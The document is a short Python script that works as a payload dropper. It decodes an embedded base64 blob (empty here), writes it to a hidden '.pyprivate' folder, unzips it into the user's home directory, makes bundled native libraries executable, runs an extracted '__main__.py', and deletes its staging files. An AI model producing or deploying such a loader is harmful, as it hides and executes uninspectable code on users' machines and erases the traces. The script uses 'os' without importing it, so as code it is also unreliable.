import shutil
import zipfile
import subprocess
import base64
import atexit
MyHome = os.path.expanduser("~")
Pyprivate = os.path.join(MyHome, ".pyprivate")
def cleanup():
    if os.path.exists(Pyprivate):
        try:
            shutil.rmtree(Pyprivate)
        except:
            pass

atexit.register(cleanup)
AH = ""
Dev = base64.b64decode(AH)
if not os.path.exists(Pyprivate):
    os.makedirs(Pyprivate)


Mahos = os.path.join(Pyprivate, "CanYou")
with open(Mahos, "wb") as f:
    f.write(Dev)


with zipfile.ZipFile(Mahos, 'r') as zip_ref:
    zip_ref.extractall(MyHome)  


Arm = [
    os.path.join(MyHome, "arm64-v8a"),
    os.path.join(MyHome, "armeabi-v7a"),
    os.path.join(MyHome, "Pyahmed.so")
]


for Call in Arm:
    if os.path.isfile(Call):  
        os.chmod(Call, 0o755)


Do_Not = os.path.join(MyHome, "__main__.py")
try:
    subprocess.run(["python", Do_Not], check=True, cwd=MyHome)
except subprocess.CalledProcessError as e:
    print(e)


cleanup()

